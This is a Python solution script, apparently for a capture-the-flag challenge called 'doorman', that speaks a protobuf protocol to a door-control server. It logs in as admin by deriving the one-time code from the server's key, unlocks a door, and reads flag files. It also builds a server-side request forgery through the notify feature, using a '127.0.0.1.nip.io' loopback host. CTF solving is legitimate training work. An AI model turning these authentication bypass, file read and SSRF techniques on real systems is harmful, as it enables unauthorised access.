import doorman_pb2
from proto_req import ProtobufSocket
import socket
import sys
import struct
from utils import xor

class DoormanClient:
    def __init__(self, host, port):
        self._host = host
        self._port = port
        self._sock = None
        self._key = None
    
    def open(self):
        if self._sock is None:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.connect((self._host, self._port))

    def __enter__(self):
        self.open()
        return self

    def close(self):
        if self._sock is not None:
            self._sock.close()
            self._sock = None

    def __exit__(self, exception_type, exception_value, exception_traceback):
        self.close()

    def recv(self) -> doorman_pb2.Response:
        proto_sock = ProtobufSocket(self._sock)
        resp = doorman_pb2.Response()
        proto_sock.recv(resp)
        return resp

    def send(self, request: doorman_pb2.Request):
        proto_sock = ProtobufSocket(self._sock)
        proto_sock.send(request)
        
    def login(self, username: str, password: str, otp: str) -> doorman_pb2.Response:
        password = xor(password.encode(), self.get_key())
        body = doorman_pb2.LoginBody(username=username, password=password, otp=otp)
        request = doorman_pb2.Request(type=doorman_pb2.REQUEST_LOGIN, body_login=body)

        self.send(request)

        return self.recv()
    
    def req_door(self, id: int, should_unlock: bool):
        body = doorman_pb2.DoorBody(id=id, should_unlock=should_unlock)
        request = doorman_pb2.Request(type=doorman_pb2.REQUEST_DOOR, body_door=body)

        self.send(request)

        return self.recv()
    

    def req_logs(self, id, should_list: bool):
        body = doorman_pb2.LogsBody(id=id, should_list=should_list)
        request = doorman_pb2.Request(type=doorman_pb2.REQUEST_LOGS, body_logs=body)

        self.send(request)

        return self.recv()
    

    def req_notify(self, host: str, body: bytes):
        body = doorman_pb2.NotifyBody(host=host, notification=body)
        request = doorman_pb2.Request(type=doorman_pb2.REQUEST_NOTIFY, body_notify=body)

        self.send(request)

        return self.recv()

    def get_key(self):
        if self._key is not None:
            return self._key

        announcement = self.recv()
        if announcement.is_error:
            raise Exception('No key sent')
        
        hex_key = announcement.message.removeprefix('KEY:')
        self._key = bytes.fromhex(hex_key)
        return self._key

    def get_otp(self):
        return str(self._key[0])

def packetize(r):
    r = r.SerializeToString()
    return struct.pack('!H', len(r)) + r

def main(argv):
    if len(argv) != 3:
        print(f'Usage: {argv[0]} HOST PORT')
        return 1

    HOST = argv[1]
    PORT = int(argv[2])

    with DoormanClient(HOST, PORT) as client:
        client.get_key()
        client.login('admin', 'password', client.get_otp())

        # PCAP
        # print(client.req_door(9182, False))

        # print(client.req_logs('log_0.txt', False))

        # print(client.req_notify('cams.24hctf', b'Subject 2217429 has exited his cell'))

        # Flags
        print(client.req_door(9182, True))
        print(client.req_logs('flag.txt', False))

        ssrf_body = doorman_pb2.LogsBody(id='flag_admin.txt', should_list=False)
        ssrf_request = doorman_pb2.Request(type=doorman_pb2.REQUEST_LOGS, body_logs=ssrf_body)

        print(client.req_notify('127.0.0.1.nip.io', packetize(ssrf_request)))
    
    return 0

if __name__ == '__main__':
    exit(main(sys.argv))
